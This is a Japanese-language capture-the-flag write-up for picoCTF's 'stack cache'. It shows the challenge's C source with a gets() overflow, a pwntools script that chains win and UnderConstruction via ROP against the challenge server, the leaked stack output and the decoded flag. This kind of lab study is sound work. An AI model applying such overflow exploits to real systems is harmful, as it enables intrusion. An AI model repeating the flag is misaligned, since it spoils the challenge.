# stack cache
32bit バイナリ
以下のコードが渡される
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 16
#define FLAGSIZE 64
#define INPSIZE 10

/*
This program is compiled statically with clang-12
without any optimisations.
*/

void win() {
  char buf[FLAGSIZE];
  char filler[BUFSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
}

void UnderConstruction() {
        // this function is under construction
        char consideration[BUFSIZE];
        char *demographic, *location, *identification, *session, *votes, *dependents;
	char *p,*q, *r;
	// *p = "Enter names";
	// *q = "Name 1";
	// *r = "Name 2";
        unsigned long *age;
	printf("User information : %p %p %p %p %p %p\n",demographic, location, identification, session, votes, dependents);
	printf("Names of user: %p %p %p\n", p,q,r);
        printf("Age of user: %p\n",age);
        fflush(stdout);
}

void vuln(){
   char buf[INPSIZE];
   printf("Give me a string that gets you the flag\n");
   gets(buf);
   printf("%s\n",buf);
   return;
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  printf("Bye!");
  return 0;
}
```

`win`関数ではflagをスタックに読み出すだけ
`underConstruction`関数で中身のないポインタを引数に`printf`を呼んでいる
ポインタの実態がないので呼べばスタックの中身が読みだされそう

## solver
ROPで関数を連続して呼び出す
```python
from pwn import *

# io = process("./vuln")
io = remote("saturn.picoctf.net", 59050)
elf = ELF("./vuln")
rop = ROP(elf)

io.recvuntil("Give me a string that gets you the flag")
rop.raw(b"a" * (10 + 4))
rop.raw(p32(elf.symbols["win"]))
rop.raw(p32(elf.symbols["UnderConstruction"]))
print(rop.dump())

io.sendline(rop.chain())

print(io.recvall())
```
出力のhexをASCIIで直すとflagが出てくる
オーダーがリトルエンディアンであることに注意

```bash
User information : 0x80c9a04 0x804007d 0x36343532 0x37383139 0x5f597230 0x6d334d5f\nNames of user: 0x50755f4e 0x34656c43 0x7b465443\nAge of user: 0x6f636970\n
```

```
}64527819_Yr0m3M_Pu_N4elC{FTCocip
```
